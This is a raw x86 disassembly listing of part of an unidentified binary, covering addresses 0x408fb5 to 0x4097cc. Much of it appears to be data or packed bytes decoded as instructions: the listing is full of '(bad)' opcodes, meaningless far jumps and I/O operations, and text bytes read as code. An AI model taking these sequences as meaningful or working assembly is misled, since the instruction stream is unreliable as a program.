  408fb5:	mov    ecx,DWORD PTR [ebx-0x74747475]
  408fbb:	mov    ecx,DWORD PTR [ebx+0x59ffff8b]
  408fc1:	xchg   esp,eax
  408fc2:	inc    edi
  408fc3:	mov    bh,bh
  408fc5:	inc    DWORD PTR [ebx]
  408fc7:	aad    0xe
  408fc9:	out    0x2b,eax
  408fcb:	xchg   ebp,eax
  408fcc:	mov    ebp,0xc7f5aa0
  408fd1:	mov    al,0xeb
  408fd3:	xor    al,0xc7
  408fd5:	test   BYTE PTR ss:[esi],ch
  408fd8:	and    dl,BYTE PTR [edi+0x16e42272]
  408fde:	mov    cl,BYTE PTR [ebx-0x48a1aaa8]
  408fe4:	push   ebx
  408fe5:	pop    eax
  408fe6:	lods   eax,DWORD PTR ds:[esi]
  408fe7:	pop    ebp
  408fe8:	sbb    bh,bh
  408fea:	push   DWORD PTR [ebp+0x3]
  408fed:	(bad)  
  408fee:	call   FWORD PTR [edx+0x15]
  408ff1:	std    
  408ff2:	inc    DWORD PTR [eax]
  408ff4:	jbe    0x409022
  408ff6:	mov    eax,0xc7dafd85
  408ffb:	push   ss
  408ffc:	add    dh,al
  408ffe:	or     ebp,DWORD PTR [ebx-0x6a3416b3]
  409004:	cli    
  409005:	add    dl,BYTE PTR [ebx]
  409007:	or     eax,0xaf43d3a5
  40900c:	add    BYTE PTR [eax],al
  40900e:	add    BYTE PTR [edx+0x29935948],dh
  409014:	aad    0x9d
  409016:	xchg   esp,eax
  409017:	xchg   esi,eax
  409018:	and    eax,0x419d1244
  40901d:	xchg   ecx,eax
  40901e:	lahf   
  40901f:	lock add eax,0xeb3ec180
  409025:	xor    DWORD PTR ds:0xba821482,esp
  40902b:	sub    eax,DWORD PTR [eax]
  40902d:	add    BYTE PTR [ecx+0x902c],dl
  409033:	add    BYTE PTR [ebp-0x7a7a7a7b],al
  409039:	test   DWORD PTR [ebp+0xe018585],eax
  40903f:	pop    es
	...
  409048:	add    bh,bh
  40904a:	dec    DWORD PTR [esi-0x3a]
  40904d:	xchg   edx,eax
  40904e:	sbb    BYTE PTR ds:0x20aaf5a0,0x23
  409055:	add    dl,BYTE PTR [ebp-0x25]
  409058:	mov    edi,0xed5f325f
  40905d:	push   esp
  40905e:	cmp    BYTE PTR [ecx-0xca88ef],cl
  409064:	push   DWORD PTR [ebp-0x69000098]
  40906a:	pop    ss
  40906b:	(bad)  
  40906c:	call   DWORD PTR [edi-0x2f]
  40906f:	stos   BYTE PTR es:[edi],al
  409070:	int    0x49
  409072:	xchg   esi,eax
  409073:	call   0x8475:0x5e2dfd13
  40907a:	outs   dx,BYTE PTR ds:[esi]
  40907b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40907c:	jp     0x4090ef
  40907e:	je     0x40908a
  409080:	bound  esi,QWORD PTR gs:[si+0x63]
  409085:	cs jb  0x4090a8
  409088:	or     ch,BYTE PTR gs:[esi]
  40908b:	outs   dx,BYTE PTR ds:[esi]
  40908c:	popa   
  40908d:	outs   dx,BYTE PTR ds:[esi]
  40908e:	sub    BYTE PTR [edi+ebp*2],bh
  409091:	gs cs das 
  409094:	jb     0x4090ff
  409096:	gs push ebx
  409098:	and    BYTE PTR ds:[ecx+0x2e],ch
  40909c:	gs push ebx
  40909e:	je     0x4090c8
  4090a0:	cmp    al,0x6f
  4090a2:	push   ebx
  4090a3:	cs cs popaw 
  4090a7:	ins    DWORD PTR es:[edi],dx
  4090a8:	ins    DWORD PTR es:[edi],dx
  4090a9:	outs   dx,BYTE PTR ds:[esi]
  4090aa:	gs jne 0x4090d5
  4090ad:	je     0x409102
  4090af:	jb     0x409124
  4090b1:	and    BYTE PTR [ebp+0x72],cl
  4090b4:	cs fs cmp al,0x65
  4090b8:	or     eax,0x656c4d63
  4090bd:	jo     0x409124
  4090bf:	outs   dx,DWORD PTR ds:[esi]
  4090c0:	push   edi
  4090c1:	jb     0x409107
  4090c3:	jae    0x409128
  4090c5:	jae    0x409140
  4090c7:	ins    DWORD PTR es:[edi],dx
  4090c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4090c9:	aaa    
  4090ca:	cli    
  4090cb:	xchg   BYTE PTR [ecx-0x1c00009f],ch
  4090d1:	jnp    0x4090a2
  4090d3:	xchg   edi,edi
  4090d5:	(bad)  
  4090d6:	call   DWORD PTR [edi+0x40]
  4090d9:	ds jo  0x409139
  4090dc:	xor    al,0xbc
  4090de:	lea    ebx,[ebx]
  4090e0:	dec    esi
  4090e1:	xor    bh,BYTE PTR [ebx-0x545d5164]
  4090e7:	push   ebp
  4090e8:	retf   
  4090e9:	xchg   BYTE PTR ss:[eax+0x64679b93],ch
  4090f0:	in     al,dx
  4090f1:	jb     0x40913a
  4090f3:	mov    esp,0x6e75062d
  4090f8:	les    esi,FWORD PTR [edi]
  4090fa:	(bad)  
  4090fb:	(bad)  
  4090fc:	in     al,dx
  4090fd:	clc    
  4090fe:	(bad)  
  4090ff:	(bad)  
  409100:	inc    DWORD PTR [eax]
	...
  40910a:	add    BYTE PTR ds:0x4040419,dh
  409110:	add    al,0x4
  409112:	add    al,0x4
  409114:	add    al,0x4
  409116:	add    BYTE PTR [eax],al
  409118:	xchg   edx,eax
  409119:	out    0x54,eax
  40911b:	test   ecx,0x2ef2bb1b
  409121:	fbstp  TBYTE PTR [ebp+0x52]
  409124:	dec    edi
  409125:	cmp    DWORD PTR [ecx],ebx
  409127:	xchg   esi,eax
  409128:	fmul   DWORD PTR [esi]
  40912a:	mov    DWORD PTR [esp+edi*2+0xbba50c],esp
  409131:	add    BYTE PTR ds:0x83de8043,dl
  409137:	push   ds
  409138:	aas    
  409139:	cmp    al,0x2a
  40913b:	dec    esp
  40913c:	rcl    DWORD PTR [edi],1
  40913e:	shr    BYTE PTR [ebx],1
  409140:	mov    BYTE PTR [eax+0x1d],dl
  409143:	cmp    BYTE PTR [esi-0x28b2ad56],0x9f
  40914a:	push   ebp
  40914b:	test   eax,0x2e3cc7
  409150:	add    BYTE PTR [ecx+0x35],ah
  409153:	pop    eax
  409154:	add    BYTE PTR [eax],al
  409156:	sbb    esp,edx
  409158:	pop    eax
  409159:	add    BYTE PTR [eax],al
  40915b:	dec    ecx
  40915c:	sbb    ah,BYTE PTR [ecx+edx*4-0x2585971f]
  409163:	std    
  409164:	sti    
  409165:	jmp    FWORD PTR [edi-0x76e7cb4e]
  40916b:	mov    ah,0x9d
  40916d:	cmp    dl,BYTE PTR [eax+0x47aaab0d]
  409173:	add    BYTE PTR [eax],al
  409175:	add    BYTE PTR [ebx+ebp*8+0x0],ah
  409179:	add    BYTE PTR [edi],dh
  40917b:	lds    eax,FWORD PTR [eax]
  40917d:	add    BYTE PTR [eax],al
  40917f:	or     al,0xc
  409181:	or     al,0xc
  409183:	or     al,0xc
  409185:	or     al,0xc
  409187:	or     al,0x60
  409189:	into   
  40918a:	or     esi,eax
  40918c:	pop    ebp
  40918d:	sbb    eax,0x43c01691
  409192:	test   al,0x31
  409194:	fnsave [ecx-0x65]
  409197:	mov    ch,0x5c
  409199:	push   esi
  40919a:	dec    edx
  40919b:	pop    ss
  40919c:	out    dx,al
  40919d:	xor    DWORD PTR [ebp-0x42],ebx
  4091a0:	(bad)  
  4091a1:	(bad)  
  4091a2:	(bad)  
  4091a3:	(bad)  
  4091a4:	(bad)  
  4091a5:	(bad)  
  4091a6:	(bad)  
  4091a7:	(bad)  
  4091a8:	dec    DWORD PTR [ebx-0x73407675]
  4091ae:	sub    BYTE PTR [ebx+0x5d1cca8b],cl
  4091b4:	cli    
  4091b5:	pop    ebx
  4091b6:	push   esp
  4091b7:	lods   al,BYTE PTR ds:[esi]
  4091b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091b9:	adc    DWORD PTR [ebx+0x34],edi
  4091bc:	test   DWORD PTR [ebx],edx
  4091be:	jecxz  0x4091bc
  4091c0:	lock xor eax,0x196ef4a4
  4091c6:	arpl   WORD PTR [edi-0x2af4526a],si
  4091cc:	idiv   BYTE PTR [ebx-0x12]
  4091cf:	out    0x1c,eax
  4091d1:	pop    eax
  4091d2:	out    0xf9,eax
  4091d4:	mov    ecx,DWORD PTR [ebx-0x74747969]
  4091da:	push   edi
  4091db:	mov    ds:0x2c008b68,eax
  4091e0:	sbb    edi,DWORD PTR [ebp-0x76]
  4091e3:	pop    ebx
  4091e4:	cmp    esp,DWORD PTR [edx-0xe]
  4091e7:	sbb    BYTE PTR [edx+0x794246c5],bl
  4091ed:	dec    eax
  4091ee:	pop    es
  4091ef:	into   
  4091f0:	or     al,0x3
  4091f2:	push   ds
  4091f3:	cmp    DWORD PTR [ecx],0xc573
  4091f9:	add    BYTE PTR [ebx],al
  4091fb:	cld    
  4091fc:	xor    al,0x41
  4091fe:	les    ecx,FWORD PTR [edx-0x4367732e]
  409204:	mov    ch,BYTE PTR [ebp-0x35]
  409207:	ds jmp 0x8dc2:0x2391702
  40920f:	dec    ecx
  409210:	and    al,0x1f
  409212:	add    al,0xab
  409214:	add    edi,esi
  409216:	xor    BYTE PTR [eax],al
  409218:	add    cl,al
  40921a:	shl    dl,0x0
  40921d:	add    BYTE PTR [eax],al
  40921f:	or     al,0xc
  409221:	or     al,0xc
  409223:	or     al,0xc
  409225:	or     al,0xc
  409227:	or     al,0x7c
  409229:	das    
  40922a:	in     eax,dx
	...
  409233:	add    ah,cl
  409235:	int3   
  409236:	sbb    DWORD PTR [edi+0x28],edx
  409239:	loop   0x40924f
  40923b:	mov    bh,0xc9
  40923d:	aaa    
  40923e:	bound  ebx,QWORD PTR [ebp+eax*2-0xd]
  409242:	dec    eax
  409243:	pusha  
  409244:	ret    0x97ea
  409247:	push   es
  409248:	ins    BYTE PTR es:[edi],dx
  409249:	inc    edi
  40924a:	adc    cl,BYTE PTR [ebx-0x3333fb05]
  409250:	ficom  WORD PTR [esi]
  409252:	int3   
  409253:	int3   
  409254:	mov    dl,0xc0
  409256:	int3   
  409257:	int3   
  409258:	sbb    DWORD PTR [edx+0x51740e32],eax
  40925e:	mov    ecx,0x4bded83c
  409263:	stc    
  409264:	loope  0x4092bf
  409266:	dec    edx
  409267:	and    BYTE PTR [edi-0x7a],bl
  40926a:	stc    
  40926b:	xchg   edi,eax
  40926c:	dec    ebx
  40926d:	clc    
  40926e:	add    ch,BYTE PTR [ecx]
  409270:	int3   
  409271:	add    BYTE PTR [ebx],bh
  409273:	mov    esi,0x3cfb
  409278:	add    BYTE PTR [ecx],al
  40927a:	push   edi
  40927b:	in     eax,dx
  40927c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40927d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40927e:	cmp    eax,0x886991b8
  409283:	scas   al,BYTE PTR es:[edi]
  409284:	stos   DWORD PTR es:[edi],eax
  409285:	in     eax,dx
  409286:	sbb    eax,0xc4947851
  40928b:	sub    esp,esi
  40928d:	pushf  
  40928e:	pop    eax
  40928f:	(bad)  
  409290:	popa   
  409291:	mov    DWORD PTR [ebp+0x29],ebx
  409294:	push   edi
  409295:	sbb    BYTE PTR [esp+edx*4-0x1a],dl
  409299:	inc    ebx
  40929a:	icebp  
  40929b:	mov    al,BYTE PTR [eax]
  40929d:	add    BYTE PTR [eax-0x1d],cl
	...
  4092ac:	add    DWORD PTR [ebx-0x5e],0xffffffff
  4092b3:	(bad)  
  4092b4:	(bad)  
  4092b5:	(bad)  
  4092b6:	(bad)  
  4092b7:	inc    DWORD PTR [eax]
  4092b9:	add    BYTE PTR [ebx+eax*8-0x75],dl
  4092bd:	push   ds
  4092be:	lods   eax,DWORD PTR ds:[esi]
  4092bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092c0:	and    ebp,DWORD PTR [edx+0xd]
  4092c3:	jmp    0x46de0ab7
  4092c8:	icebp  
  4092c9:	add    al,0x56
  4092cb:	mov    eax,ds
  4092cd:	jnp    0x409272
  4092cf:	pop    edi
  4092d0:	jo     0x4092b2
  4092d2:	add    BYTE PTR [eax],al
  4092d4:	in     eax,dx
  4092d5:	les    edx,FWORD PTR [ebp+0x2f]
  4092d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092d9:	arpl   WORD PTR [ebx-0x5c],ax
  4092dc:	test   cl,ch
  4092de:	pop    edx
  4092df:	fstp   QWORD PTR [edi+0x6d3c6556]
  4092e5:	or     dh,BYTE PTR [edx+0xa]
  4092e8:	popa   
  4092e9:	jb     0x409319
  4092eb:	push   edi
  4092ec:	jb     0x409353
  4092ee:	popa   
  4092ef:	je     0x409356
  4092f1:	and    BYTE PTR [ebp+ebp*2+0x3e],dh
  4092f5:	je     0x40935c
  4092f7:	gs push ebx
  4092f9:	push   ebx
  4092fa:	outs   dx,DWORD PTR ds:[esi]
  4092fb:	push   ebx
  4092fc:	or     ah,BYTE PTR [ebp+0x65]
  4092ff:	je     0x409373
  409301:	jae    0x409370
  409303:	push   esp
  409304:	and    BYTE PTR cs:[ebp+0x6e],ah
  409308:	gs cs jae 0x40932c
  40930c:	jae    0x409376
  40930e:	outs   dx,BYTE PTR ds:[esi]
  40930f:	bound  ebp,QWORD PTR [edi]
  409311:	cmp    ah,BYTE PTR [ebp+0x20]
  409314:	gs jbe 0x409386
  409317:	and    BYTE PTR [esi+0x43],ch
  40931a:	and    BYTE PTR gs:[eax+0x69],dh
  40931e:	and    BYTE PTR [esi+0x53],ah
  409321:	and    BYTE PTR [ebp+0x62],ah
  409324:	and    ch,BYTE PTR [ecx+0xd]
  409327:	or     al,BYTE PTR cs:[ecx+0x66]
  40932b:	gs ins DWORD PTR es:[edi],dx
  40932d:	outs   dx,BYTE PTR ds:[esi]
  40932e:	imul   edi,DWORD PTR [edx],0x70692e73
  409334:	gs jb  0x409357
  409337:	outs   dx,BYTE PTR cs:[esi]
  409339:	cmp    al,0x62
  40933b:	push   edx
  40933c:	outs   dx,DWORD PTR ds:[esi]
  40933d:	outs   dx,BYTE PTR ds:[esi]
  40933e:	or     ah,BYTE PTR [ebp-0x23]
  409341:	jmp    0x409333
  409343:	loop   0x40937b
  409345:	lahf   
  409346:	jae    0x409381
  409348:	jle    0x4092ff
  40934a:	shr    BYTE PTR [edi+0x3a00fd],0x0
  409351:	outs   dx,BYTE PTR ds:[esi]
  409352:	and    DWORD PTR [eax+eax*1+0x0],0x164cbb
  40935a:	add    BYTE PTR [edx-0x27],dh
  40935d:	fcomp  QWORD PTR [ecx+0x43ded836]
  409363:	adc    DWORD PTR [ebx],eax
  409365:	xor    DWORD PTR [edx-0x4a47ee48],esp
  40936b:	jmp    0x76bd60e8
  409370:	mov    esp,ebx
  409372:	fild   WORD PTR [eax]
  409374:	add    BYTE PTR [eax],al
  409376:	and    eax,0xcf00004a
  40937b:	mov    dl,0x0
	...
  409385:	add    BYTE PTR [eax],al
  409387:	add    bh,bl
  409389:	pop    eax
  40938a:	jle    0x4093ba
  40938c:	add    edi,edi
  40938e:	test   BYTE PTR [esi-0x4ba1f248],al
  409394:	mov    esp,0xbd343eb0
  409399:	add    eax,0xeecb121d
  40939e:	mov    DWORD PTR [eax+eax*1],0x0
  4093a5:	add    BYTE PTR [eax],al
  4093a7:	add    BYTE PTR [eax],al
  4093a9:	add    BYTE PTR [eax],al
  4093ab:	repnz mov dh,0x79
  4093ae:	out    dx,al
  4093af:	add    BYTE PTR [eax],al
  4093b1:	mov    DWORD PTR [eax+ecx*8],ecx
  4093b4:	imul   ecx,ecx,0xe38b3b5a
  4093ba:	je     0x4093a9
  4093bc:	cmp    eax,0x40fdc1c1
  4093c1:	loope  0x409362
  4093c3:	sub    eax,0x6e8d0126
  4093c8:	xchg   edx,eax
  4093c9:	fnstenv ss:[eax]
  4093cc:	or     DWORD PTR [edi+0xb593fd],0x6f70
  4093d6:	mov    eax,0x770000e4
  4093db:	adc    BYTE PTR [eax+0x0],0x75
  4093df:	stc    
  4093e0:	loope  0x409434
  4093e2:	fcmovnu st,st(7)
  4093e4:	imul   edx,DWORD PTR [ecx],0x7ec55b58
  4093ea:	sbb    dl,BYTE PTR [esi]
  4093ec:	mov    al,ds:0x9e20ea97
  4093f1:	fmul   st,st(1)
  4093f3:	push   esp
  4093f4:	sub    ch,BYTE PTR [ebp+0x5c]
  4093f7:	jne    0x40946e
  4093f9:	jne    0x409398
  4093fb:	mov    esp,0x6d4f4855
  409400:	(bad)  
  409401:	push   ebx
  409402:	sahf   
  409403:	neg    edx
  409405:	push   0x20c62169
  40940a:	enter  0x58c3,0x77
  40940e:	mov    ebx,0x4e8142d5
  409413:	sbb    BYTE PTR [edi+0x75754628],0x50
  40941a:	fimul  DWORD PTR [ebp+0x75]
  40941d:	jne    0x409494
	...
  409427:	add    BYTE PTR [eax+eiz*8+0x7],ch
  40942e:	add    BYTE PTR [eax],al
  409430:	add    BYTE PTR [eax],al
  409432:	add    BYTE PTR [eax],al
  409434:	call   0xe25dd821
  409439:	mov    eax,ds:0xec5892fd
  40943e:	pushf  
  40943f:	sub    DWORD PTR [ecx+ebx*2+0x4317ccd6],esi
  409446:	xlat   BYTE PTR ds:[ebx]
  409447:	mov    ebx,0x9a7590a7
  40944c:	jne    0x4094ab
  40944e:	call   0xe8f18f3b
  409453:	call   0xe928eb02
  409458:	(bad)  
  409459:	mov    WORD PTR [edi+0x41],ds
  40945c:	mov    edx,DWORD PTR [eax-0x4d]
  40945f:	pop    ss
  409460:	and    eax,esp
  409462:	cmp    dl,BYTE PTR [edi+0x1d]
  409465:	cmp    BYTE PTR [eax],0xec
  409468:	mov    bl,0x57
  40946a:	xor    dh,ch
  40946c:	sbb    eax,0xe8e6a9fa
  409471:	add    BYTE PTR [ebp+0x10],ch
  409474:	cld    
  409475:	je     0x409477
  409477:	add    BYTE PTR [eax],al
  409479:	pop    ebx
  40947a:	fmul   DWORD PTR [ebp-0x71]
  40947d:	loopne 0x4094ee
  40947f:	(bad)  
  409480:	hlt    
  409481:	enter  0x3746,0x42
  409485:	mov    ecx,DWORD PTR [edi]
  409487:	jne    0x4094df
  409489:	nop
  40948a:	jmp    0x409494
  40948c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40948d:	or     cl,BYTE PTR ds:0x5648936a
  409493:	push   0xe047aee6
  409498:	mov    ch,BYTE PTR [esi]
  40949a:	xchg   edx,eax
  40949b:	jmp    0xe0df94a0
	...
  4094ac:	sti    
  4094ad:	mov    gs:0x0,al
  4094b3:	add    BYTE PTR [eax],al
  4094b5:	add    BYTE PTR [eax],al
  4094b7:	add    BYTE PTR [eax],cl
  4094b9:	or     BYTE PTR [ebx+0x48645596],ch
  4094bf:	and    DWORD PTR ds:0xebfcca5c,esi
  4094c5:	call   0xa48d:0xa13e275c
  4094cc:	inc    esi
  4094cd:	and    ah,bl
  4094cf:	xchg   edi,eax
  4094d0:	neg    BYTE PTR [eax+0x62300808]
  4094d6:	dec    ecx
  4094d7:	and    cl,BYTE PTR [esi]
  4094d9:	mov    ebp,0xa4fc7ec
  4094de:	das    
  4094df:	mov    ecx,0xbbef377
  4094e4:	out    dx,eax
  4094e5:	cwde   
  4094e6:	mov    esi,0xe9de4b0f
  4094eb:	repnz cli 
  4094ed:	shr    DWORD PTR [edi+0x1],cl
  4094f0:	dec    ebp
  4094f1:	or     BYTE PTR [eax],cl
  4094f3:	xchg   si,ax
  4094f5:	test   al,0x8
  4094f7:	or     BYTE PTR [edi],cl
  4094f9:	mov    eax,esp
  4094fb:	or     bh,bh
  4094fd:	pusha  
  4094fe:	cwde   
  4094ff:	and    BYTE PTR [edx+0x9],ch
  409502:	test   BYTE PTR [ebp+0x220556bc],ah
  409508:	pop    es
  409509:	or     eax,0x1c83dbec
  40950e:	jnp    0x4094d4
  409510:	xor    eax,0x6c0361c5
  409515:	(bad)  
  409516:	(bad)  
  409517:	jmp    FWORD PTR [ecx+0x2bffffed]
  40951d:	sti    
  40951e:	(bad)  
  40951f:	(bad)  
  409520:	inc    DWORD PTR [eax]
	...
  40952a:	mov    edx,0xf194d765
  40952f:	sub    esi,DWORD PTR [ebp+0x26]
  409532:	jbe    0x4094d7
  409534:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409535:	sub    DWORD PTR [ebx],edx
  409537:	sahf   
  409538:	scas   al,BYTE PTR es:[edi]
  409539:	clc    
  40953a:	mov    DWORD PTR [edi+0x60],ebp
  40953d:	(bad)  
  40953e:	es dec ebp
  409540:	(bad)  
  409541:	mov    ebp,0xffffffff
  409546:	(bad)  
  409547:	(bad)  
  409548:	(bad)  
  409549:	(bad)  
  40954a:	(bad)  
  40954b:	(bad)  
  40954c:	jmp    FWORD PTR [esi]
  40954e:	jle    0x4095b9
  409550:	xor    edi,edi
  409552:	(bad)  
  409553:	mov    esi,0xb062e4af
  409558:	mov    ecx,ds
  40955a:	cs arpl sp,sp
  40955d:	and    ch,BYTE PTR [eax+0xc]
  409560:	mov    WORD PTR [eax+0x49584244],ss
  409566:	call   0xf3261496
  40956b:	xor    esi,DWORD PTR [esi-0x19]
  40956e:	pop    eax
  40956f:	outs   dx,DWORD PTR ds:[esi]
  409570:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409571:	or     al,0xb6
  409573:	sub    al,0x5c
  409575:	aam    0xff
  409577:	inc    DWORD PTR [ebx+0x55ffff19]
  40957d:	push   esi
  40957e:	scas   eax,DWORD PTR es:[edi]
  40957f:	inc    DWORD PTR [eax]
  409581:	stos   BYTE PTR es:[edi],al
  409582:	out    0x27,eax
  409584:	rcr    DWORD PTR [ebp+0x68],0x2d
  409588:	jb     0x40952c
  40958a:	data16 jecxz 0x4095c7
  40958d:	test   BYTE PTR [edi+0x75b0a014],cl
  409593:	dec    esp
  409594:	cmp    eax,0xba9c38dc
  409599:	add    BYTE PTR [eax],al
  40959b:	add    al,ah
  40959d:	pop    ecx
  40959e:	jle    0x409603
  4095a0:	mov    edx,0xcb8f1db3
  4095a5:	push   edi
  4095a6:	loope  0x4095e1
  4095a8:	dec    esi
  4095a9:	sbb    ch,cl
  4095ab:	and    al,BYTE PTR [ecx-0x7e7a8398]
  4095b1:	pop    ss
  4095b2:	adc    al,al
  4095b4:	out    0x6,eax
  4095b6:	and    ebx,DWORD PTR [bx+si+0x0]
  4095ba:	add    dh,bh
  4095bc:	mov    ds:0x9f,eax
  4095c1:	mov    ecx,DWORD PTR [ebx-0x74747475]
  4095c7:	mov    ecx,DWORD PTR [ebx+0x1cda1e8b]
  4095cd:	(bad)  
  4095ce:	(bad)  
  4095cf:	(bad)  
  4095d0:	(bad)  
  4095d1:	(bad)  
  4095d2:	(bad)  
  4095d3:	(bad)  
  4095d4:	(bad)  
  4095d5:	inc    eax
  4095d7:	shl    cl,0x45
  4095da:	(bad)  
  4095db:	repz jno 0x409641
  4095de:	push   edi
  4095df:	xor    esp,DWORD PTR [esi+0x4a]
  4095e2:	ds pop eax
  4095e4:	cmp    eax,0x5ab74e55
  4095e9:	pop    ss
  4095ea:	mov    bh,0x4e
  4095ec:	enter  0xc152,0xd1
  4095f0:	shl    BYTE PTR [edx+0x74],0x20
  4095f4:	outs   dx,BYTE PTR cs:[esi]
  4095f6:	imul   ecx,DWORD PTR ds:[ecx+0x62],0x6e726e65
  4095fe:	bound  esp,QWORD PTR [ebx+0x73]
  409601:	cs data16 jae 0x409667
  409605:	gs inc esp
  409607:	or     eax,0x6c2e2078
  40960c:	outs   dx,DWORD PTR ds:[esi]
  40960d:	jae    0x409653
  40960f:	jae    0x409686
  409611:	je     0x409688
  409613:	and    BYTE PTR [edx+eiz*2+0x3c],ah
  409617:	and    BYTE PTR [ebx+0x2e],dh
  40961a:	jb     0x40964a
  40961c:	outs   dx,DWORD PTR ds:[esi]
  40961d:	imul   ebp,DWORD PTR gs:[edi+0xd],0x65202f22
  409625:	and    ah,BYTE PTR [ebx+0x64]
  409628:	je     0x40967d
  40962a:	jb     0x40964c
  40962c:	arpl   WORD PTR [edx-0x40],sp
  40962f:	aaa    
  409630:	mov    eax,eax
  409632:	shl    BYTE PTR [esi+0x17],0xc0
  409636:	shl    BYTE PTR [esi],0x2b
  409639:	sbb    al,0xa
  40963b:	test   al,0x4a
  40963d:	loopne 0x4095e5
  40963f:	mov    dh,0xdb
  409641:	inc    ebx
  409642:	jb     0x409612
  409644:	out    0x53,al
  409646:	sub    esi,DWORD PTR [edi]
  409648:	push   0x73e1611a
  40964d:	cmpxchg eax,eax
  409650:	add    BYTE PTR [esi-0x44],cl
  409653:	punpckhbw mm0,QWORD PTR [eax]
  409656:	add    BYTE PTR [eax],al
  409658:	push   ds
  409659:	xchg   ebp,eax
  40965a:	pop    esp
  40965b:	ins    BYTE PTR es:[edi],dx
  40965c:	push   ebx
  40965d:	sub    ah,BYTE PTR [edx+0x6d]
  409660:	cmp    ah,bl
  409662:	out    dx,al
  409663:	inc    edi
  409664:	cli    
  409665:	das    
  409666:	std    
  409667:	imul   eax,ebx,0x46
  40966a:	cs pop esi
  40966c:	mov    cl,0xd0
  40966e:	add    DWORD PTR [ebp-0x2d],ebx
  409671:	fisttp QWORD PTR [esi+ebx*8]
  409674:	fptan  
  409676:	sbb    DWORD PTR [edi+0x67],esi
  409679:	sbb    esp,eax
  40967b:	add    BYTE PTR [eax],al
  40967d:	and    DWORD PTR [esi-0x1000000],0xffffffff
  409687:	(bad)  
  409688:	(bad)  
  409689:	(bad)  
  40968a:	(bad)  
  40968b:	fld    QWORD PTR [edx+0x24242481]
  409691:	and    al,0x24
  409693:	and    al,0x24
  409695:	and    al,0x24
  409697:	add    BYTE PTR [eax],al
  409699:	stc    
  40969a:	sbb    bl,al
  40969c:	mov    fs,WORD PTR ds:0x3b8ae373
  4096a2:	inc    edx
  4096a3:	stc    
  4096a4:	adc    DWORD PTR [ecx+0x1e35851f],edi
  4096aa:	mov    eax,0xa0f01257
  4096af:	jl     0x409708
  4096b1:	add    BYTE PTR [eax],al
  4096b3:	mov    cl,0xb3
  4096b5:	inc    ebx
  4096b6:	icebp  
  4096b7:	xor    eax,DWORD PTR fs:[edx+edx*8-0x51aba35f]
  4096bf:	fstp   TBYTE PTR [ebx-0x3c]
  4096c2:	push   eax
  4096c3:	adc    al,0xb7
  4096c5:	cmp    eax,0x24b18029
  4096ca:	adc    eax,DWORD PTR [ecx+0x2a]
  4096cd:	sbb    dh,dh
  4096cf:	adc    al,BYTE PTR [eax]
  4096d1:	add    BYTE PTR [edx],ch
  4096d3:	pop    edi
  4096d4:	push   ss
  4096d5:	add    BYTE PTR [eax],al
  4096d7:	cmc    
  4096d8:	mov    edi,0x1d24006c
  4096dd:	outs   dx,DWORD PTR ds:[esi]
  4096de:	jnp    0x4096b6
  4096e0:	(bad)  
  4096e1:	shr    BYTE PTR [esi+0x2d1b94e2],1
  4096e7:	and    ebx,DWORD PTR [edx+edx*8]
  4096ea:	mov    cl,0x63
  4096ec:	daa    
  4096ed:	push   ebx
  4096ee:	jne    0x4096c5
  4096f0:	add    eax,0x245bc1ca
  4096f5:	and    al,0x24
  4096f7:	mov    eax,ds:0xdb2424f2
  4096fc:	test   eax,0x8b242424
  409701:	mov    ecx,DWORD PTR [ebx-0x74747475]
  409707:	mov    ecx,DWORD PTR [ebx-0x7039fc30]
  40970d:	enter  0x4dea,0x4d
  409711:	sub    al,0x2c
  409713:	mov    ds:0x841fa055,eax
  409718:	mov    WORD PTR [ebp-0x3a3ddba6],?
  40971e:	dec    ecx
  40971f:	fstp   TBYTE PTR [edx+0x75]
  409722:	jne    0x409799
  409724:	jne    0x40979b
  409726:	jne    0x40979d
  409728:	jne    0x40979f
  40972a:	add    BYTE PTR [eax],al
  40972c:	shl    DWORD PTR [eax+0x8cf0],1
  409732:	in     al,dx
  409733:	mov    cl,0xd
  409735:	sbb    eax,0xaa167905
  40973a:	mov    ebp,0x81041f43
  40973f:	jne    0x4097a0
  409741:	repz dec esi
  409743:	jp     0x409781
  409745:	push   esi
  409746:	xor    edi,DWORD PTR [edi-0x45b51f2e]
  40974c:	or     al,0x70
  40974e:	mov    WORD PTR cs:[ebx+0x4ee0d175],ds
  409755:	add    BYTE PTR [eax],al
  409757:	mov    edi,0x230000f1
  40975c:	jb     0x40971f
  40975e:	add    BYTE PTR [ebx+0x2b159ebb],al
  409764:	aad    0xbf
  409766:	jmp    0xe4ec:0x2fc5f839
  40976d:	scas   eax,DWORD PTR es:[edi]
  40976e:	stos   BYTE PTR es:[edi],al
  40976f:	dec    esi
  409770:	mov    ch,dl
  409772:	or     BYTE PTR [ebx+0x26fd6713],bl
  409778:	add    DWORD PTR [ebx+0x54529f83],0x17
  40977f:	retf   
  409780:	sub    eax,0x3c50f1b0
  409785:	jl     0x409759
  409787:	add    eax,DWORD PTR [esi]
  409789:	shl    BYTE PTR [edi],0x2f
  40978c:	les    edx,FWORD PTR ds:0xa8f3440b
  409792:	out    dx,al
  409793:	loopne 0x40973b
  409795:	scas   al,BYTE PTR es:[edi]
  409796:	pusha  
  409797:	xor    DWORD PTR [ebx-0xf004f7d],eax
  40979d:	add    DWORD PTR [ebx-0x7d],0xffffffff
  4097a4:	(bad)  
  4097a5:	(bad)  
  4097a6:	(bad)  
  4097a7:	(bad)  
  4097a8:	dec    DWORD PTR [ebx-0x9797]
  4097ae:	(bad)  
  4097af:	(bad)  
  4097b0:	(bad)  
  4097b1:	(bad)  
  4097b2:	(bad)  
  4097b3:	(bad)  
  4097b4:	dec    DWORD PTR [ebp-0x7963d773]
  4097ba:	cmp    DWORD PTR [edx+0x49],eax
  4097bd:	jns    0x40982e
  4097bf:	xchg   edx,eax
  4097c0:	inc    edi
  4097c1:	push   0x50
  4097c3:	pop    ebp
  4097c4:	ror    DWORD PTR [eax+0x12626e1a],1
  4097ca:	je     0x4097d0
  4097cc:	icebp  
